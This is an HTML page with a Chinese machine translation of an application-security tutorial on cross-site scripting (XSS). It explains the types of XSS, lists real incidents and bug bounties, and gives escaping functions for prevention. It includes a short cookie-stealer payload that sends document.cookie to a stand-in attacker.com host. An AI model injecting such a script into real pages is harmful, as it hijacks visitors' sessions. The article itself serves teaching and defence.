<html>
<head>
<title>Cross-site Scripting (XSS) 😈</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨站点脚本(XSS)😈</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f?source=collection_archive---------7-----------------------#2020-10-16">https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f?source=collection_archive---------7-----------------------#2020-10-16</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="38a2" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">它是什么，为什么重要，它们是如何执行的，如何防止XSS漏洞，以及如何创建一个cookie窃取者！</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/f58aee854b6ceaad842f8b2cb99d439f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Lh4AcC8cyuPTGJKl"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">纳赫尔·阿卜杜勒·哈迪在<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的照片</figcaption></figure><p id="ddc4" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi lv translated"><span class="l lw lx ly bm lz ma mb mc md di"> C </span> ross-site scripting (XSS)是一种针对网站的攻击，攻击者可以让被攻击的网站向用户发送JavaScript。然后在用户的机器上执行该恶意JavaScript。</p><p id="aa38" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">各种类型的XSS是有区别的:</p><ul class=""><li id="3e01" class="me mf it lb b lc ld lf lg li mg lm mh lq mi lu mj mk ml mm bi translated"><strong class="lb iu">存储的XSS </strong>:攻击者可以让网站存储XSS，例如，通过在Twitch上创建包含恶意消息的脸书评论或聊天消息。然后，恶意消息被发送到访问该页面的每个新客户端。</li><li id="7001" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">XSS:有些网站允许你创建可以分享的链接。例如，谷歌搜索。URL包含搜索词，如果有人点击该链接，谷歌将在页面上显示该链接中的搜索词。所以Google在页面上反映了链接的一个参数。如果攻击者更改搜索词以包含代码，则该代码可能会被点击链接的任何用户的浏览器执行。</li><li id="be07" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu">基于DOM的XSS </strong>:在现代web应用程序中，逻辑主要在客户端。这意味着攻击者不需要进入服务器端就可以进行破坏。现场JavaScript被攻击。与反映的XSS相反，服务器并没有直接导致问题。页面上的(有效)JavaScript读取了攻击。</li></ul><p id="9e72" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">对于现代网站来说,<strong class="lb iu">攻击面</strong>相当大。</p><blockquote class="ms"><p id="c223" class="mt mu it bd mv mw mx my mz na nb lu dk translated">任何用户提供的数据都可能包含XSS攻击。它可以是评论区、广告、文档、推荐人、URL片段等等</p></blockquote></div><div class="ab cl nc nd hx ne" role="separator"><span class="nf bw bk ng nh ni"/><span class="nf bw bk ng nh ni"/><span class="nf bw bk ng nh"/></div><div class="im in io ip iq"><h1 id="37f5" class="nj nk it bd nl nm nn no np nq nr ns nt jz nu ka nv kc nw kd nx kf ny kg nz oa bi translated">为什么它很重要</h1><ul class=""><li id="31ce" class="me mf it lb b lc ob lf oc li od lm oe lq of lu mj mk ml mm bi translated">XSS是OWASP十大漏洞之一，这意味着它被认为是一个常见的漏洞</li><li id="10eb" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">mitre.org上有<strong class="lb iu">14625个CVE条目针对XSS </strong>漏洞(<a class="ae ky" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site" rel="noopener ugc nofollow" target="_blank">来源</a>)</li><li id="7814" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">2005年 : MySpace上有一种叫做<a class="ae ky" href="https://en.wikipedia.org/wiki/Samy_(computer_worm)" rel="noopener ugc nofollow" target="_blank"> Samy </a>的蠕虫。20小时内，作者就有一百万用户加他为好友(<a class="ae ky" href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever" rel="noopener ugc nofollow" target="_blank">来源</a>)。由于XSS的攻击，MySpace不得不关闭网站。</li><li id="02b2" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2011 </strong>:脸书蠕虫允许自动墙贴(<a class="ae ky" href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments" rel="noopener ugc nofollow" target="_blank">来源</a>)</li><li id="30dc" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2013 </strong>:贝宝被<a class="ae ky" href="https://s3cur3.it/references" rel="noopener ugc nofollow" target="_blank">罗伯特·库格勒</a>发现存在漏洞(<a class="ae ky" href="https://seclists.org/fulldisclosure/2013/May/163" rel="noopener ugc nofollow" target="_blank">来源</a>)。很有可能创建一个链接，当你点击它的时候，你就可以付费，而不需要你去交互。</li><li id="34ff" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2013 </strong>:雅虎易受XSS的影响(<a class="ae ky" href="https://arstechnica.com/information-technology/2013/01/how-yahoo-allowed-hackers-to-hijack-my-neighbors-e-mail-account/" rel="noopener ugc nofollow" target="_blank">来源</a></li><li id="e944" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2016 </strong>:研究人员在脸书发现XSS漏洞(<a class="ae ky" href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/" rel="noopener ugc nofollow" target="_blank">来源</a>)</li><li id="31c4" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2018 </strong>:优步很容易受到XSS的攻击(<a class="ae ky" href="https://hackerone.com/reports/191810" rel="noopener ugc nofollow" target="_blank">来源</a>)。优步为此支付了3000美元。</li><li id="c23a" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2019 </strong> : Steam易受存储的XSS攻击(<a class="ae ky" href="https://hackerone.com/reports/409850" rel="noopener ugc nofollow" target="_blank">来源</a>)。Steam为此支付了7500美元。</li><li id="11b6" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2020 </strong>:脸书为寻找XSS袭击<a class="ae ky" href="https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty" rel="noopener ugc nofollow" target="_blank">来源</a>支付<strong class="lb iu">2万美元</strong>。</li><li id="a04d" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated"><strong class="lb iu"> 2020 </strong> : Tumblr容易受到基于DOM的XSS攻击(<a class="ae ky" href="https://hackerone.com/reports/882546" rel="noopener ugc nofollow" target="_blank">来源</a>)。Automattic为此支付了350美元。</li></ul><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi og"><img src="../Images/e537f0891d982807294f6dddb19fd9b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ExwQ55rXgbShCgmN"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">aaron Blanco Tejedor在<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="f416" class="nj nk it bd nl nm oh no np nq oi ns nt jz oj ka nv kc ok kd nx kf ol kg nz oa bi translated">XSS袭击是如何实施的？</h1><p id="5118" class="pw-post-body-paragraph kz la it lb b lc ob ju le lf oc jx lh li om lk ll lm on lo lp lq oo ls lt lu im bi lv translated">以下是攻击者造成危害的各种方式:如果网站上有XSS的脚本，他们可以使网站无法使用。他们可以运行一个<strong class="lb iu">加密货币挖掘器</strong>。他们可以<strong class="lb iu">窃取敏感数据</strong>。</p><p id="bb09" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">正如承诺的那样，接下来是如何为<strong class="lb iu">账户劫持</strong>设计一个<strong class="lb iu"> cookie窃取者</strong>。</p><p id="e961" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">我们只是假设我们有一个像脸书这样的网站，你可以在那里添加评论。我们假设评论只是照原样复制给每个打开页面的人。我们的意见是</p><pre class="kj kk kl km gt op oq or os aw ot bi"><span id="464a" class="ou nk it oq b gy ov ow l ox oy">&lt;script&gt;<br/>    image = new Image();<br/>    image.src='<a class="ae ky" href="https://attacker.com/?'+document.cookie" rel="noopener ugc nofollow" target="_blank">https://attacker.com/steal?cookie='+document.cookie</a>;<br/>&lt;/script&gt;</span></pre><p id="3187" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">您可以看到这不会做任何事情——对于其他用户来说，这看起来只是一条空消息。它不会刷新页面。它不会打开另一个窗口。但是它将调用带有一个参数<code class="fe oz pa pb oq b">cookie</code>的GET请求<code class="fe oz pa pb oq b">http://attacker.com/steal</code>。因此，在攻击者方面，只需要有一个可到达的web服务器，并记录这些请求。之后，攻击者可以使用cookie并冒充受害者。攻击者不知道受害者的凭证，而是劫持了会话。</p></div><div class="ab cl nc nd hx ne" role="separator"><span class="nf bw bk ng nh ni"/><span class="nf bw bk ng nh ni"/><span class="nf bw bk ng nh"/></div><div class="im in io ip iq"><h1 id="cf7c" class="nj nk it bd nl nm nn no np nq nr ns nt jz nu ka nv kc nw kd nx kf ny kg nz oa bi translated">我能做些什么来防止XSS袭击？</h1><p id="1b2b" class="pw-post-body-paragraph kz la it lb b lc ob ju le lf oc jx lh li om lk ll lm on lo lp lq oo ls lt lu im bi lv translated"><span class="l lw lx ly bm lz ma mb mc md di"> N </span>曾经盲目信任用户数据。移除潜在有害零件，避开会改变预期输出的零件。你可能想去掉和<code class="fe oz pa pb oq b">&lt;script&gt;</code>标签或者用<code class="fe oz pa pb oq b">&amp;lt;</code>代替<code class="fe oz pa pb oq b">&lt;</code>。但是这还不够。您还可以使用<a class="ae ky" href="https://www.w3schools.com/jsref/event_onload.asp" rel="noopener ugc nofollow" target="_blank"> onload属性</a>来执行JavaScript。该属性可以添加到许多甚至所有的HTML标签中。</p><p id="3646" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">各种语言都有避免这些错误的方法:</p><ul class=""><li id="c91b" class="me mf it lb b lc ld lf lg li mg lm mh lq mi lu mj mk ml mm bi translated">去:<code class="fe oz pa pb oq b"><a class="ae ky" href="https://golang.org/pkg/html/#EscapeString" rel="noopener ugc nofollow" target="_blank">EscapeString</a></code></li><li id="ed45" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">Java: <code class="fe oz pa pb oq b"><a class="ae ky" href="https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringEscapeUtils.html#escapeHtml(java.lang.String)" rel="noopener ugc nofollow" target="_blank">org.apache.commons.lang.StringEscapeUtils.escapeHtml</a></code></li><li id="2bb1" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">JavaScript: <code class="fe oz pa pb oq b"><a class="ae ky" href="https://www.npmjs.com/package/dompurify" rel="noopener ugc nofollow" target="_blank">DOMPurify</a></code></li><li id="7931" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">Python: <code class="fe oz pa pb oq b"><a class="ae ky" href="https://docs.python.org/3/library/html.html#html.escape" rel="noopener ugc nofollow" target="_blank">html.escape</a></code></li><li id="0844" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">PHP: <code class="fe oz pa pb oq b"><a class="ae ky" href="https://www.php.net/manual/en/function.htmlspecialchars.php" rel="noopener ugc nofollow" target="_blank">htmlspecialchars</a></code></li><li id="765a" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">鲁比:<code class="fe oz pa pb oq b"><a class="ae ky" href="https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB/Util.html#method-c-html_escape" rel="noopener ugc nofollow" target="_blank">htmlescape</a></code></li><li id="836d" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">生锈:<code class="fe oz pa pb oq b"><a class="ae ky" href="https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html" rel="noopener ugc nofollow" target="_blank">htmlescape::encode_miniaml</a></code></li></ul><p id="0d08" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">此外，请确保您尽可能早地这样做。应该有一种安全的方法来使用数据库中的数据——并且不需要知道其中有潜在的有害数据。因此，在将数据放入数据库之前，对其进行转义。确保转义是<a class="ae ky" href="https://en.wikipedia.org/wiki/Idempotence" rel="noopener ugc nofollow" target="_blank">幂等的</a> —转义两次应该和转义一次一样。如果你真的认为你在某处需要原件，你可以在数据库中有一个<code class="fe oz pa pb oq b">_raw</code>字段。或者有一个数据访问层(DAL)来处理转义。</p><p id="4c7f" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">记住<strong class="lb iu">清理所有用户输入</strong>，不仅仅是输入字段中的内容。不要忘记<a class="ae ky" href="https://martin-thoma.com/tags.html#klausur-ref" rel="noopener ugc nofollow" target="_blank"> URL片段</a>和<code class="fe oz pa pb oq b"><a class="ae ky" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer" rel="noopener ugc nofollow" target="_blank">Document.referrer</a></code>。</p><h1 id="82cd" class="nj nk it bd nl nm oh no np nq oi ns nt jz oj ka nv kc ok kd nx kf ol kg nz oa bi translated">请参见</h1><p id="6b55" class="pw-post-body-paragraph kz la it lb b lc ob ju le lf oc jx lh li om lk ll lm on lo lp lq oo ls lt lu im bi translated">我喜欢<a class="ae ky" href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)" rel="noopener ugc nofollow" target="_blank">汤姆·斯科特</a>和<a class="ae ky" href="https://www.youtube.com/user/Computerphile" rel="noopener ugc nofollow" target="_blank">电脑爱好者</a>他们制作了一个关于这个话题的视频！</p><figure class="kj kk kl km gt kn"><div class="bz fp l di"><div class="pc pd l"/></div></figure><h1 id="94ea" class="nj nk it bd nl nm oh no np nq oi ns nt jz oj ka nv kc ok kd nx kf ol kg nz oa bi translated">下一步是什么？</h1><p id="c1aa" class="pw-post-body-paragraph kz la it lb b lc ob ju le lf oc jx lh li om lk ll lm on lo lp lq oo ls lt lu im bi translated">在这个关于应用安全(AppSec)的系列文章中，我们已经解释了攻击者的一些技术😈以及防守队员的技术😇：</p><ul class=""><li id="2ab1" class="me mf it lb b lc ld lf lg li mg lm mh lq mi lu mj mk ml mm bi translated">第1部分:<a class="ae ky" href="https://medium.com/faun/sql-injections-e8bc9a14c95" rel="noopener"> SQL注入</a>😈</li><li id="4c60" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第二部分:<a class="ae ky" rel="noopener ugc nofollow" target="_blank" href="/leaking-secrets-240a3484cb80">不要泄密</a>😇</li><li id="a8e6" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第3部分:<a class="ae ky" rel="noopener ugc nofollow" target="_blank" href="/cross-site-scripting-xss-fd374ce71b2f">跨站点脚本(XSS) </a>😈</li><li id="6cd1" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第四部分:<a class="ae ky" rel="noopener ugc nofollow" target="_blank" href="/password-hashing-eb3b97684636">密码哈希</a>😇</li><li id="d78d" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第五部分:<a class="ae ky" href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112" rel="noopener"> ZIP炸弹</a>😈</li><li id="8cc6" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第六部分:<a class="ae ky" href="https://medium.com/plain-and-simple/captcha-500991bd90a3" rel="noopener">验证码</a>😇</li><li id="d9c6" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第七部分:<a class="ae ky" href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf" rel="noopener">电子邮件欺骗</a>😈</li><li id="9b63" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">第8部分:<a class="ae ky" href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e" rel="noopener">软件组成分析</a> (SCA)😇</li></ul><p id="4139" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">这即将到来:</p><ul class=""><li id="c6fa" class="me mf it lb b lc ld lf lg li mg lm mh lq mi lu mj mk ml mm bi translated">CSRF😈</li><li id="7505" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">磁盘操作系统😈</li><li id="8842" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">凭据填充😈</li><li id="5a21" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">密码劫持😈</li><li id="0b84" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">单点登录😇</li><li id="2ad4" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">双因素认证😇</li><li id="ccd3" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">备份😇</li><li id="46f8" class="me mf it lb b lc mn lf mo li mp lm mq lq mr lu mj mk ml mm bi translated">磁盘加密😇</li></ul><p id="de5a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">如果您对更多关于AppSec / InfoSec的文章感兴趣，请告诉我！</p></div></div>    
</body>
</html>